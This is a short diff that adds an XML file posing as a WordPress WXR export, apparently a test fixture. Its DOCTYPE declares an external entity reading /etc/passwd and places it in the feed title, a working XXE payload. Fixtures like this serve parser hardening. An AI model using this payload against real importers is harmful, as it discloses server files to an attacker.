@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> <!ENTITY lol "lol"> ]>
+<rss version="2.0" xmlns:wp="http://wordpress.org/export/1.2/"><channel><wp:wxr_version>1.2</wp:wxr_version><title>&xxe;</title></channel></rss>
